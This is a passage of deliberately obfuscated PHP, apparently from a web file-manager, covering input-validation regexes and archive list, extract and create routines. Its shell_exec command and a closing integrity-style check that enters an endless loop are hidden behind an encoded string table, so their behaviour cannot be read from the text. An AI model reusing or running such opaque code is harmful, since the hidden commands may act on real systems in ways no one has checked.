$Dä¼Ì­ÂšØ[$aÌŒáæšÍõ] = $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1269]]; } } else { $a õÒÜ¯[] = $fËÎõİÓ–¿; } continue; } $Dä¼Ì­ÂšØ[$aÌŒáæšÍõ] = $in[$c®ª„°êƒ†]; goto B‘ ÏÙ¡À; A¨ÔéÀ¤ªÇ: if (!array_key_exists($c®ª„°êƒ†, $in)) { if (array_key_exists($fé³ÚÜšÕ™[1269], $EÕ®·Áé¨ó)) { if (!is_null($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1269]])) { $Dä¼Ì­ÂšØ[$aÌŒáæšÍõ] = $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1269]]; } } else { if (isset($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1270]])) { $a õÒÜ¯[] = $fËÎõİÓ–¿; } } continue; } if (isset($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1270]]) && $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1270]] == $fé³ÚÜšÕ™[285]) { $d±ğšïå¢× = json_decode($in[$c®ª„°êƒ†], !0); if (is_array($d±ğšïå¢×)) { $Dä¼Ì­ÂšØ[$aÌŒáæšÍõ] = $d±ğšïå¢×; } else { if (array_key_exists($fé³ÚÜšÕ™[1269], $EÕ®·Áé¨ó)) { if (!is_null($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1269]])) { $Dä¼Ì­ÂšØ[$aÌŒáæšÍõ] = $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1269]]; } } else { $a õÒÜ¯[] = $fËÎõİÓ–¿; } } continue; } $A–¼›«Æ¾š = _get($EÕ®·Áé¨ó, $fé³ÚÜšÕ™[756]); goto A¶·ğ—ˆ”; B‘ ÏÙ¡À: } goto AÒ‘èöùÇŸ; B¡ò—ñø¤: $fé³ÚÜšÕ™ =& $_SERVER[İåâé¾]; global $in; $Dä¼Ì­ÂšØ = array(); goto cï†Æñ‘Ì•; FƒÍÕ‚Ó§: } public static function reg($D£–éòŒó® = "\162\145\x71\x75\x69\162\x65") { static $DÔ”Œƒ‹¨÷ = array("\x72\145\161\x75\x69\162\x65" => "\56\x2b", "\x6e\x75\x6d\x62\145\x72" => "\x5c\x64\53", "\150\x65\170" => "\x5b\x30\x2d\x39\x41\55\106\141\55\x66\x5d\x2b", "\151\x6e\164" => "\133\x2d\134\x2b\x5d\x3f\134\144\53", "\x62\157\157\x6c" => "\x30\x7c\61", "\146\x6c\x6f\141\164" => "\x5b\55\134\x2b\135\x3f\134\x64\x2b\x28\134\x2e\134\144\53\51\77", "\145\156\147\154\x69\163\x68" => "\133\101\x2d\x5a\x61\x2d\172\40\x5d\x2b", "\143\x68\x69\x6e\x65\x73\x65" => "\133\134\170\173\64\x65\60\x30\175\x2d\134\170\173\71\x66\x61\65\175\135\x2b", "\x68\141\x73\103\150\x69\x6e\x65\163\145" => "\57\50\133\134\170\x7b\x34\x65\x30\x30\x7d\x2d\x5c\170\x7b\71\x66\141\x35\175\x5d\x2b\x29\x2f\x75", "\x65\x6d\141\151\154" => "\x5c\167\53\50\133\134\x2e\134\x2d\x5d\134\167\x2b\51\x2a\134\100\x5c\167\x2b\x28\x5b\x5c\56\134\55\135\134\x77\53\51\x2a\134\56\x5c\x77\53", "\160\150\x6f\156\145" => "\x31\133\63\64\65\x37\70\135\x5c\x64\173\x39\175", "\x74\145\x6c\160\x68\x6f\x6e\x65" => "\x28\134\x28\x5c\x64\173\x33\54\64\x7d\134\51\x7c\134\144\173\x33\54\x34\x7d\x2d\174\x5c\163\x29\77\x5c\x64\173\67\54\61\x34\175", "\165\162\154" => "\x28\150\164\x74\160\174\146\164\x70\x7c\150\x74\164\x70\163\51\72\134\x2f\134\x2f\133\x5c\x77\x5c\x2d\137\x5d\53\50\134\56\x5b\x5c\x77\x5c\55\137\135\53\x29\x2b\50\x5b\x5c\x77\x5c\55\x5c\x2e\x2c\100\77\136\x3d\45\46\x3a\x5c\x2f\176\x5c\53\43\135\x2a\x5b\x5c\x77\134\55\134\x40\77\x5e\x3d\x25\46\134\57\x7e\x5c\53\43\x5d\x29\x3f", "\165\162\154\106\165\154\x6c" => "\133\x61\x2d\172\101\x2d\172\135\x2b\72\x5c\57\x5c\x2f\x5b\136\134\163\135\52", "\x69\160" => "\50\x5c\x64\173\x31\54\63\x7d\x5c\x2e\51\173\63\x7d\x28\134\144\173\61\x2c\63\175\51", "\172\151\160" => "\x5b\x31\55\x39\x5d\134\x64\173\65\x7d\x28\77\x21\134\144\x29", "\x69\144\103\141\162\144" => "\50\134\x64\173\x31\x35\x7d\51\174\50\x5c\x64\173\61\67\175\x28\x5c\144\174\x58\174\170\51\x29", "\x63\x6f\154\157\x72" => "\43\x28\133\x30\55\71\101\x2d\106\141\x2d\x66\x5d\x7b\63\x7d\174\133\x30\x2d\71\x41\x2d\x46\141\55\146\135\x7b\66\x7d\x29", "\164\x69\155\x65" => "\50\133\x30\x2d\61\x5d\x5c\x64\x7c\62\x5b\x30\x2d\x34\x5d\51\72\x5b\60\55\65\x5d\134\x64", "\x64\x61\164\x65" => "\134\x64\173\x34\175\133\x2d\x5c\57\135\77\x28\x30\133\x31\55\71\x5d\x7c\x31\x5b\x30\55\62\x5d\x29\133\x2d\x5c\x2f\x5d\77\x28\x5b\60\x2d\62\135\134\144\x7c\63\x5b\60\55\61\x5d\x29", "\144\141\164\145\124\x69\x6d\145" => "\x5c\x64\x7b\x34\x7d\x5b\x2d\x5c\x2f\135\x3f\x28\x30\x5b\61\55\71\x5d\174\61\x5b\60\55\62\135\x29\x5b\x2d\x5c\57\135\x3f\50\133\x30\x2d\62\135\x5c\144\x7c\63\133\x30\x2d\61\x5d\x29\x5c\x73\53\50\133\x30\55\61\135\134\144\x7c\x32\133\x30\55\x34\135\x29\x3a\x5b\x30\55\65\x5d\134\x64", "\160\x61\x73\x73\167\x6f\x72\144" => "\50\77\75\x2e\x2a\x5c\144\x29\50\77\75\56\52\133\x61\55\172\x5d\x29\x28\x3f\75\x2e\52\x5b\x41\x2d\132\x5d\51\x2e\x7b\70\x2c\62\x30\175", "\x6b\x65\171" => "\133\101\x2d\132\x61\55\x7a\60\55\x39\x5f\134\55\x5c\x2e\x5d\53", "\x6b\145\x79\106\x75\154\x6c" => "\x5b\x41\55\132\141\55\x7a\x30\55\x39\x5f\x5c\55\x5c\56\x5c\x73\54\135\53"); if (!$D£–éòŒó®) { return $DÔ”Œƒ‹¨÷; } return $DÔ”Œƒ‹¨÷[$D£–éòŒó®]; } public static function check($dŠéò£–˜ã, $AáÑ¶…©¶°, $b™­½­„‰‚ = null) { $dğÄä†½¶Ü =& $_SERVER[İåâé¾]; switch ($AáÑ¶…©¶°) { case $dğÄä†½¶Ü[7]: return in_array($dŠéò£–˜ã, $b™­½­„‰‚); break; case $dğÄä†½¶Ü[1272]: return floatval($dŠéò£–˜ã) > $b™­½­„‰‚; break; case $dğÄä†½¶Ü[1273]: return floatval($dŠéò£–˜ã) < $b™­½­„‰‚; break; case $dğÄä†½¶Ü[328]: return strlen($dŠéò£–˜ã) >= $b™­½­„‰‚[0] && strlen($dŠéò£–˜ã) <= $b™­½­„‰‚[1]; break; case $dğÄä†½¶Ü[328]: if (is_array($b™­½­„‰‚)) { return strlen($dŠéò£–˜ã) >= $b™­½­„‰‚[0] && strlen($dŠéò£–˜ã) <= $b™­½­„‰‚[1]; break; } else { return strlen($dŠéò£–˜ã) == $b™­½­„‰‚; break; } case $dğÄä†½¶Ü[324]: return floatval($dŠéò£–˜ã) >= $b™­½­„‰‚[0] && floatval($dŠéò£–˜ã) <= $b™­½­„‰‚[1]; break; } $D×¶›ßŠâ = self::reg(!1); $AáÑ¶…©¶° = isset($D×¶›ßŠâ[$AáÑ¶…©¶°]) ? $D×¶›ßŠâ[$AáÑ¶…©¶°] : $AáÑ¶…©¶°; if (substr($AáÑ¶…©¶°, 0, 1) != $dğÄä†½¶Ü[8]) { $AáÑ¶…©¶° = $dğÄä†½¶Ü[1274] . $AáÑ¶…©¶° . $dğÄä†½¶Ü[1275]; } return preg_match($AáÑ¶…©¶°, $dŠéò£–˜ã) === 1; } public static function get($D‘¤¹ÃÏØ, $e‹‚çŒùªÙ = null, $EÜ‘éÓÛ÷ó = null, $fÑÙÍ”ŒÃ = null) { goto F¦¥ÆÓŒä±; cÍ¦øœ¨ŒË: if (!is_null($fÑÙÍ”ŒÃ)) { $D­ø©ø‡[$FÃªŸç¿[756]] = $fÑÙÍ”ŒÃ; } if (!is_null($e‹‚çŒùªÙ)) { $D­ø©ø‡[$FÃªŸç¿[1270]] = $e‹‚çŒùªÙ; } $Dé¹–¸è¡ = Input::getArray(array($D‘¤¹ÃÏØ => $D­ø©ø‡)); goto c£íô½—˜°; c£íô½—˜°: return $Dé¹–¸è¡[$D‘¤¹ÃÏØ]; goto c‰Ù‚ë³Î™; F¦¥ÆÓŒä±: $FÃªŸç¿ =& $_SERVER[İåâé¾]; $D­ø©ø‡ = array(); if (!is_null($EÜ‘éÓÛ÷ó)) { $D­ø©ø‡[$FÃªŸç¿[34]] = $EÜ‘éÓÛ÷ó; } goto cÍ¦øœ¨ŒË; c‰Ù‚ë³Î™: } } class KodArchive { static function init() { goto Eç÷ïôÍáó; bì°²¨Ì•‹: require_once ARCHIVE_LIB . $d»Œ‚Şæ»[1284]; require_once ARCHIVE_LIB . $d»Œ‚Şæ»[1285]; require_once ARCHIVE_LIB . $d»Œ‚Şæ»[1286]; goto E ‚æ§ÕŒï; B×ğ’ãñÇö: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $d»Œ‚Şæ»[1282]; require_once ARCHIVE_LIB . $d»Œ‚Şæ»[1283]; goto bì°²¨Ì•‹; Eç÷ïôÍáó: $d»Œ‚Şæ» =& $_SERVER[İåâé¾]; if (defined($d»Œ‚Şæ»[1276])) { return; } define($d»Œ‚Şæ»[1276], SDK_DIR . $d»Œ‚Şæ»[1277]); goto aåËš¾òòŠ; aåËš¾òòŠ: define($d»Œ‚Şæ»[1278], TEMP_FILES); define($d»Œ‚Şæ»[1279], TEMP_FILES); define($d»Œ‚Şæ»[1280], $d»Œ‚Şæ»[1281]); goto B×ğ’ãñÇö; E ‚æ§ÕŒï: require_once ARCHIVE_LIB . $d»Œ‚Şæ»[1287]; goto d„çå‹­•; d„çå‹­•: } static function checkIfType($aË”šÆ§”, $d£‘ğè–™¬) { goto C·ŒîÏöî•; f¯‘ÙàÚÍ¦: return $Aíç™ÊÓ¼å; goto cºˆ´µÅ“„; C·ŒîÏöî•: $d‹«„˜ùÎ‰ =& $_SERVER[İåâé¾]; self::init(); $Eš¾šïêÑã = array($d‹«„˜ùÎ‰[304] => array($d‹«„˜ùÎ‰[304], $d‹«„˜ùÎ‰[1288], $d‹«„˜ùÎ‰[1289], $d‹«„˜ùÎ‰[1290]), $d‹«„˜ùÎ‰[1291] => array($d‹«„˜ùÎ‰[1291], $d‹«„˜ùÎ‰[1292], $d‹«„˜ùÎ‰[1293], $d‹«„˜ùÎ‰[1294]), $d‹«„˜ùÎ‰[792] => array($d‹«„˜ùÎ‰[792], $d‹«„˜ùÎ‰[1295], $d‹«„˜ùÎ‰[1296], $d‹«„˜ùÎ‰[1297], $d‹«„˜ùÎ‰[1298], $d‹«„˜ùÎ‰[1299], $d‹«„˜ùÎ‰[1300])); goto có’ÃÀÈÊ; có’ÃÀÈÊ: $Aíç™ÊÓ¼å = in_array($aË”šÆ§”, $Eš¾šïêÑã[$d£‘ğè–™¬]); if ($Aíç™ÊÓ¼å && ($d£‘ğè–™¬ == $d‹«„˜ùÎ‰[304] || $d£‘ğè–™¬ == $d‹«„˜ùÎ‰[1291]) && (!function_exists($d‹«„˜ùÎ‰[1301]) || !function_exists($d‹«„˜ùÎ‰[1302]))) { show_tips($d‹«„˜ùÎ‰[1303]); } if ($Aíç™ÊÓ¼å && $d£‘ğè–™¬ == $d‹«„˜ùÎ‰[792] && (!function_exists($d‹«„˜ùÎ‰[1304]) || !strstr(shell_exec($d‹«„˜ùÎ‰[1305]), $d‹«„˜ùÎ‰[1306]))) { show_tips($d‹«„˜ùÎ‰[1307]); } goto f¯‘ÙàÚÍ¦; cºˆ´µÅ“„: } static function listContent($C¦è…´µ“—, $Aé‰Å”ŠÌ° = true) { $EèçÇÏÁòŒ =& $_SERVER[İåâé¾]; self::init(); $DËó³®Ï™ù = $GLOBALS[$EèçÇÏÁòŒ[793]] ? $GLOBALS[$EèçÇÏÁòŒ[793]] : get_path_ext($C¦è…´µ“—); $A§Œè‡Êëƒ = !1; if (self::checkIfType($DËó³®Ï™ù, $EèçÇÏÁòŒ[1291])) { $Cƒ¤Ï©§†Ê = PclTarList($C¦è…´µ“—, $DËó³®Ï™ù); $A§Œè‡Êëƒ = array(); for ($bø´ª­¹Œç = 0; $bø´ª­¹Œç < count($Cƒ¤Ï©§†Ê); $bø´ª­¹Œç++) { $F«ì•‚ƒ—º = $Cƒ¤Ï©§†Ê[$bø´ª­¹Œç]; if ($F«ì•‚ƒ—º[$EèçÇÏÁòŒ[1308]] == $EèçÇÏÁòŒ[1309] || $F«ì•‚ƒ—º[$EèçÇÏÁòŒ[1308]] == $EèçÇÏÁòŒ[1310]) { continue; } if ($Aé‰Å”ŠÌ°) { $F«ì•‚ƒ—º[$EèçÇÏÁòŒ[1311]] = ltrim($F«ì•‚ƒ—º[$EèçÇÏÁòŒ[1311]], $EèçÇÏÁòŒ[886]); } if ($F«ì•‚ƒ—º[$EèçÇÏÁòŒ[1308]] == $EèçÇÏÁòŒ[1312]) { $F«ì•‚ƒ—º[$EèçÇÏÁòŒ[77]] = !0; } else { $F«ì•‚ƒ—º[$EèçÇÏÁòŒ[77]] = !1; } $F«ì•‚ƒ—º[$EèçÇÏÁòŒ[784]] = $bø´ª­¹Œç; $A§Œè‡Êëƒ[] = $F«ì•‚ƒ—º; } } else { if (self::checkIfType($DËó³®Ï™ù, $EèçÇÏÁòŒ[792])) { $b¿ÏéÇ£Â = kodRarArchive::listContent($C¦è…´µ“—); if (!$b¿ÏéÇ£Â[$EèçÇÏÁòŒ[780]]) { return $b¿ÏéÇ£Â; } else { $A§Œè‡Êëƒ = $b¿ÏéÇ£Â[$EèçÇÏÁòŒ[782]]; } } else { if (kodZipArchive::support($EèçÇÏÁòŒ[356])) { $A§Œè‡Êëƒ = kodZipArchive::listContent($C¦è…´µ“—); } else { $aˆÌ‡…‹ƒ = new PclZip($C¦è…´µ“—); $A§Œè‡Êëƒ = $aˆÌ‡…‹ƒ->listContent(); } } } if ($A§Œè‡Êëƒ) { $CÂßÛ¿Í› = unzip_charset_get($A§Œè‡Êëƒ); $Aé‰Å”ŠÌ° = $Aé‰Å”ŠÌ° && function_exists($EèçÇÏÁòŒ[66]); for ($bø´ª­¹Œç = 0; $bø´ª­¹Œç < count($A§Œè‡Êëƒ); $bø´ª­¹Œç++) { $A§Œè‡Êëƒ[$bø´ª­¹Œç][$EèçÇÏÁòŒ[1311]] = str_replace(array($EèçÇÏÁòŒ[816], $EèçÇÏÁòŒ[1313]), $EèçÇÏÁòŒ[530], $A§Œè‡Êëƒ[$bø´ª­¹Œç][$EèçÇÏÁòŒ[1311]]); if ($Aé‰Å”ŠÌ°) { $A§Œè‡Êëƒ[$bø´ª­¹Œç][$EèçÇÏÁòŒ[1311]] = iconv_to($A§Œè‡Êëƒ[$bø´ª­¹Œç][$EèçÇÏÁòŒ[1311]], $CÂßÛ¿Í›, $EèçÇÏÁòŒ[329]); unset($A§Œè‡Êëƒ[$bø´ª­¹Œç][$EèçÇÏÁòŒ[1314]]); } } return array($EèçÇÏÁòŒ[780] => !0, $EèçÇÏÁòŒ[782] => $A§Œè‡Êëƒ); } else { return array($EèçÇÏÁòŒ[780] => !1, $EèçÇÏÁòŒ[782] => $A§Œè‡Êëƒ); } } static function extract($f¤‚ Ó•ª›, $C¶èñ‰Ü¦¤, $DšÑ¥Ó¶ = "\x2d\61", &$e¼æŠìÀ£‡ = false) { goto a–ì˜¬Ã³; e»¶‰Ÿöí: if (self::checkIfType($dÙÀŒŞøÙ, $EŒÔ•Éµƒ[1291])) { if ($DšÑ¥Ó¶ != $EŒÔ•Éµƒ[779]) { $FÄÙêŒ†ÃÍ = unzip_pre_name($FÄÙêŒ†ÃÍ); $Fİàë®ø† = unzip_pre_name($Fİàë®ø†); $CÅÇ´‘Û²Ò = PclTarExtractList($f¤‚ Ó•ª›, array($FÄÙêŒ†ÃÍ), $C¶èñ‰Ü¦¤, $Fİàë®ø†, $dÙÀŒŞøÙ); } else { $CÅÇ´‘Û²Ò = PclTarExtract($f¤‚ Ó•ª›, $C¶èñ‰Ü¦¤, $EŒÔ•Éµƒ[363], $dÙÀŒŞøÙ); } return array($EŒÔ•Éµƒ[780] => $CÅÇ´‘Û²Ò, $EŒÔ•Éµƒ[782] => PclErrorString(!0)); } else { if (self::checkIfType($dÙÀŒŞøÙ, $EŒÔ•Éµƒ[792])) { return kodRarArchive::extract($f¤‚ Ó•ª›, $C¶èñ‰Ü¦¤, $dÙÀŒŞøÙ, $e¼æŠìÀ£‡); } else { if (kodZipArchive::support($EŒÔ•Éµƒ[1315])) { return kodZipArchive::extract($f¤‚ Ó•ª›, $C¶èñ‰Ü¦¤, $e¼æŠìÀ£‡); } else { $A„µôÚ¤ºÔ = new PclZip($f¤‚ Ó•ª›); if ($DšÑ¥Ó¶ != $EŒÔ•Éµƒ[779]) { $CÅÇ´‘Û²Ò = $A„µôÚ¤ºÔ->extract(PCLZIP_OPT_PATH, $C¶èñ‰Ü¦¤, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EŒÔ•Éµƒ[1316], PCLZIP_OPT_BY_NAME, $Aƒ¤‘É¹‰ë[$EŒÔ•Éµƒ[1311]], PCLZIP_OPT_REMOVE_PATH, $Fİàë®ø†, PCLZIP_OPT_REPLACE_NEWER); } else { $CÅÇ´‘Û²Ò = $A„µôÚ¤ºÔ->extract(PCLZIP_OPT_PATH, $C¶èñ‰Ü¦¤, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EŒÔ•Éµƒ[1316], PCLZIP_OPT_REPLACE_NEWER); } return array($EŒÔ•Éµƒ[780] => $CÅÇ´‘Û²Ò, $EŒÔ•Éµƒ[782] => $A„µôÚ¤ºÔ->errorName(!0)); } } } return array($EŒÔ•Éµƒ[780] => !1, $EŒÔ•Éµƒ[782] => $EŒÔ•Éµƒ[1317]); goto B‹º„ŒÖŒ; a–ì˜¬Ã³: $EŒÔ•Éµƒ =& $_SERVER[İåâé¾]; self::init(); $dÙÀŒŞøÙ = $GLOBALS[$EŒÔ•Éµƒ[793]] ? $GLOBALS[$EŒÔ•Éµƒ[793]] : get_path_ext($f¤‚ Ó•ª›); goto bˆš‡ÂĞ¦Ä; bˆš‡ÂĞ¦Ä: $eĞ„³ğŒ©‚ = self::listContent($f¤‚ Ó•ª›, !1); if (!$eĞ„³ğŒ©‚[$EŒÔ•Éµƒ[780]]) { return $eĞ„³ğŒ©‚; } if ($DšÑ¥Ó¶ != $EŒÔ•Éµƒ[779]) { goto Eçã«Ùº¢Ñ; cˆÛÊø¡: if ($Aƒ¤‘É¹‰ë[$EŒÔ•Éµƒ[77]]) { $FÄÙêŒ†ÃÍ = rtrim($FÄÙêŒ†ÃÍ, $EŒÔ•Éµƒ[8]) . $EŒÔ•Éµƒ[8]; $e¼æŠìÀ£‡ = array($e¼æŠìÀ£‡); } $bÚ¿˜¹”¸ò = str_replace($EŒÔ•Éµƒ[92], $EŒÔ•Éµƒ[8], $FÄÙêŒ†ÃÍ); if (substr($bÚ¿˜¹”¸ò, -1) == $EŒÔ•Éµƒ[8]) { if (!strstr(trim($bÚ¿˜¹”¸ò, $EŒÔ•Éµƒ[8]), $EŒÔ•Éµƒ[8])) { $C¶èñ‰Ü¦¤ = $C¶èñ‰Ü¦¤ . get_path_this($bÚ¿˜¹”¸ò) . $EŒÔ•Éµƒ[8]; } } else { if ($Fİàë®ø† == $FÄÙêŒ†ÃÍ) { $Fİàë®ø† = $EŒÔ•Éµƒ[33]; } } goto e¦ò–’ŸÁ²; C¢¾öÃ£°: if ($GLOBALS[$EŒÔ•Éµƒ[6]][$EŒÔ•Éµƒ[884]] != $EŒÔ•Éµƒ[329]) { $FÄÙêŒ†ÃÍ = unzip_pre_name($e¼æŠìÀ£‡); } $Fİàë®ø† = get_path_father($e¼æŠìÀ£‡); if ($Fİàë®ø† == $e¼æŠìÀ£‡) { $Fİàë®ø† = $EŒÔ•Éµƒ[33]; } goto cˆÛÊø¡; Eçã«Ùº¢Ñ: $Aƒ¤‘É¹‰ë = self::fileIndex($eĞ„³ğŒ©‚[$EŒÔ•Éµƒ[782]], $DšÑ¥Ó¶); $e¼æŠìÀ£‡ = str_replace(array($EŒÔ•Éµƒ[816], $EŒÔ•Éµƒ[1313]), $EŒÔ•Éµƒ[71], $Aƒ¤‘É¹‰ë[$EŒÔ•Éµƒ[1311]]); $FÄÙêŒ†ÃÍ = $e¼æŠìÀ£‡; goto C¢¾öÃ£°; e¦ò–’ŸÁ²: } goto e»¶‰Ÿöí; B‹º„ŒÖŒ: } static function fileIndex($f‘¹Ÿ›ŸÆ, $Fİ¨©í‹â¡, $BøŞÙÎØ•Ú = false) { goto DÆàõÈ·; C¯ÓÇÍ‰×Ñ: $có¢å¥Ú²Ø = $Cì’ Ì²¨ ; if ($BøŞÙÎØ•Ú) { $có¢å¥Ú²Ø = $Cì’ Ì²¨ [$BøŞÙÎØ•Ú]; if ($Cì’ Ì²¨ [$CŸ…Å«ÏÙÏ[77]]) { $có¢å¥Ú²Ø = rtrim($có¢å¥Ú²Ø, $CŸ…Å«ÏÙÏ[8]) . $CŸ…Å«ÏÙÏ[8]; } } return $có¢å¥Ú²Ø; goto dä»ÃÈ‚ÙÔ; D³åÎêÃ¹½: $eÉë°øñÏ’ = count($f‘¹Ÿ›ŸÆ); for ($C„¯°¨ÓËœ = 0; $C„¯°¨ÓËœ < $eÉë°øñÏ’; $C„¯°¨ÓËœ++) { if ($Fİ¨©í‹â¡ == $f‘¹Ÿ›ŸÆ[$C„¯°¨ÓËœ][$CŸ…Å«ÏÙÏ[784]]) { $Cì’ Ì²¨  = $f‘¹Ÿ›ŸÆ[$C„¯°¨ÓËœ]; break; } } if (!$Cì’ Ì²¨ ) { show_tips($CŸ…Å«ÏÙÏ[1318]); } goto C¯ÓÇÍ‰×Ñ; DÆàõÈ·: $CŸ…Å«ÏÙÏ =& $_SERVER[İåâé¾]; self::init(); if (!is_array($f‘¹Ÿ›ŸÆ)) { return !1; } goto D³åÎêÃ¹½; dä»ÃÈ‚ÙÔ: } static function extractZipFile($AÕˆÈÁâÊ‡, $Fİ¹ä¦ÙÌÅ, $d‘´¦”šŠ = false) { goto eõÔ„Û±ĞĞ; aĞ“¿˜ğÕ: if (file_exists($DÙ“™÷²’™)) { return $DÙ“™÷²’™; } $dö†ÁÑî—‚ = new PclZip($AÕˆÈÁâÊ‡); $f–¼æøáğÈ = unzip_filter_ext($F›ÅÀ½ˆº¯ . get_path_this($Fİ¹ä¦ÙÌÅ)); goto e•à»•…ƒ; e•à»•…ƒ: $A¢¼‰Æ©çæ = get_path_father($Fİ¹ä¦ÙÌÅ); if ($A¢¼‰Æ©çæ == $Fİ¹ä¦ÙÌÅ) { $A¢¼‰Æ©çæ = $B¹©‚Ûã¥[33]; } $F¼Û¾¾‚ƒÖ = $dö†ÁÑî—‚->extract(PCLZIP_OPT_PATH, $F›ÅÀ½ˆº¯, PCLZIP_CB_PRE_FILE_NAME, $B¹©‚Ûã¥[1316], PCLZIP_OPT_REMOVE_PATH, $A¢¼‰Æ©çæ, PCLZIP_OPT_BY_NAME, $Fİ¹ä¦ÙÌÅ); goto F……ƒ•ßòÎ; F……ƒ•ßòÎ: if (!file_exists($f–¼æøáğÈ)) { return !1; } @rename($f–¼æøáğÈ, $DÙ“™÷²’™); return $DÙ“™÷²’™; goto f‰®ÉÌ¡£Ù; fÆ·°©ÁÅÏ: mk_dir($F›ÅÀ½ˆº¯); $DÙ“™÷²’™ = $F›ÅÀ½ˆº¯ . md5($AÕˆÈÁâÊ‡ . $Fİ¹ä¦ÙÌÅ); if ($d‘´¦”šŠ) { $DÙ“™÷²’™ = $F›ÅÀ½ˆº¯ . $d‘´¦”šŠ; } goto aĞ“¿˜ğÕ; eõÔ„Û±ĞĞ: $B¹©‚Ûã¥ =& $_SERVER[İåâé¾]; self::init(); $F›ÅÀ½ˆº¯ = TEMP_FILES . hash_path($AÕˆÈÁâÊ‡) . $B¹©‚Ûã¥[8]; goto fÆ·°©ÁÅÏ; f‰®ÉÌ¡£Ù: } static function filePreview($e¥áæ½ÂÃì, $b½Œ»ËõŠ, $CÔŒÍÄàÌä = false, $bÈª‡ƒ›Ô˜ = false) { goto Céì‰Š…×; Céì‰Š…×: $C›Íáèœ… =& $_SERVER[İåâé¾]; self::init(); $BŒë¨ğ±•¬ = TEMP_FILES . hash_path($e¥áæ½ÂÃì) . $C›Íáèœ…[8]; goto bİ†¸Ö½ãö; cÚŠ™Éíí¬: if (!file_exists($Fæ˜à¶²¿•)) { del_dir($BŒë¨ğ±•¬); show_json($C›Íáèœ…[1321]); } IO::fileOut($Fæ˜à¶²¿•, $CÔŒÍÄàÌä, $E˜¯œ„‘èš); goto dƒìÕ§³·£; e„‰…£´»Ú: $EÈİÓÏí©‰ = unzip_pre_name($EÈİÓÏí©‰); $E˜¯œ„‘èš = get_path_this($EÈİÓÏí©‰); $dä¢Ìö±…‚ = unzip_filter_ext($BŒë¨ğ±•¬ . $E˜¯œ„‘èš); goto CÏÉ ³Ú; Dºò‚Ñ°¬…: $e«„šÆ­½Â = self::extract($e¥áæ½ÂÃì, $BŒë¨ğ±•¬, $b½Œ»ËõŠ, $EÈİÓÏí©‰); if (is_array($EÈİÓÏí©‰)) { show_json($C›Íáèœ…[1319], !1); } if (file_exists($Fæ˜à¶²¿•)) { IO::fileOut($Fæ˜à¶²¿•, $CÔŒÍÄàÌä, get_path_this($EÈİÓÏí©‰)); return; } goto e„‰…£´»Ú; bİ†¸Ö½ãö: mk_dir($BŒë¨ğ±•¬); $Fæ˜à¶²¿• = $BŒë¨ğ±•¬ . md5($e¥áæ½ÂÃì . $b½Œ»ËõŠ . $bÈª‡ƒ›Ô˜); $EÈİÓÏí©‰ = $C›Íáèœ…[33]; goto Dºò‚Ñ°¬…; CÏÉ ³Ú: if (!$e«„šÆ­½Â[$C›Íáèœ…[780]]) { show_json($e«„šÆ­½Â[$C›Íáèœ…[782]], !1); } if (!file_exists($dä¢Ìö±…‚)) { show_json($C›Íáèœ…[1320], !1); } @rename($dä¢Ìö±…‚, $Fæ˜à¶²¿•); goto cÚŠ™Éíí¬; dƒìÕ§³·£: } static function create($FËœ§¾Š×Î, $EáÁ©¬Š¸¶) { $Có›î©Ó®¢ =& $_SERVER[İåâé¾]; self::init(); $aŒÉºğ¦› = get_path_ext($FËœ§¾Š×Î); $e…Š¡Äìô³ = !1; if (self::checkIfType($aŒÉºğ¦›, $Có›î©Ó®¢[304])) { if (kodZipArchive::support($Có›î©Ó®¢[755])) { return kodZipArchive::create($FËœ§¾Š×Î, $EáÁ©¬Š¸¶); } $F·±ÜÒƒæÈ = new PclZip($FËœ§¾Š×Î); foreach ($EáÁ©¬Š¸¶ as $D± ¥®­ŠÆ => $Aâó˜ŞÊÚ) { $Aâó˜ŞÊÚ = str_replace($Có›î©Ó®¢[1322], $Có›î©Ó®¢[8], $Aâó˜ŞÊÚ); $A±µƒÎä’ = Kodio::clear(get_path_father($Aâó˜ŞÊÚ)); if ($D± ¥®­ŠÆ == 0) { $e…Š¡Äìô³ = $F·±ÜÒƒæÈ->create($Aâó˜ŞÊÚ, PCLZIP_OPT_REMOVE_PATH, $A±µƒÎä’, PCLZIP_CB_PRE_FILE_NAME, $Có›î©Ó®¢[1323]); continue; } $e…Š¡Äìô³ = $F·±ÜÒƒæÈ->add($Aâó˜ŞÊÚ, PCLZIP_OPT_REMOVE_PATH, $A±µƒÎä’, PCLZIP_CB_PRE_FILE_NAME, $Có›î©Ó®¢[1323]); } } else { if (self::checkIfType($aŒÉºğ¦›, $Có›î©Ó®¢[1291])) { foreach ($EáÁ©¬Š¸¶ as $D± ¥®­ŠÆ => $Aâó˜ŞÊÚ) { $Aâó˜ŞÊÚ = str_replace($Có›î©Ó®¢[1322], $Có›î©Ó®¢[8], $Aâó˜ŞÊÚ); $A±µƒÎä’ = Kodio::clear(get_path_father($Aâó˜ŞÊÚ)); if ($D± ¥®­ŠÆ == 0) { $e…Š¡Äìô³ = PclTarCreate($FËœ§¾Š×Î, array($Aâó˜ŞÊÚ), $aŒÉºğ¦›, null, $A±µƒÎä’); continue; } $e…Š¡Äìô³ = PclTarAddList($FËœ§¾Š×Î, array($Aâó˜ŞÊÚ), $Có›î©Ó®¢[33], $A±µƒÎä’, $aŒÉºğ¦›); } } } return $e…Š¡Äìô³; } } if (!isset($_SERVER[$_SERVER[İåâé¾][555]]) || !isset($_SERVER[$_SERVER[İåâé¾][1178]])) { goto F™àêÖÆ‹; F™àêÖÆ‹: $B¤­Ÿ¤ì•ğ = $_SERVER[İåâé¾][556]; $dëÆä×“Ç = BASIC_PATH . $_SERVER[İåâé¾][557]; $fÍñÎŸ»ÆÂ = $B¤­Ÿ¤ì•ğ($dëÆä×“Ç); goto c³´…Ó´¦; e®¢Óó‹®‰: $cœ¦—¼³“—(BASIC_PATH . $_SERVER[İåâé¾][557]); for (;;) { $cœ¦—¼³“— = $cœ¦—¼³“— . 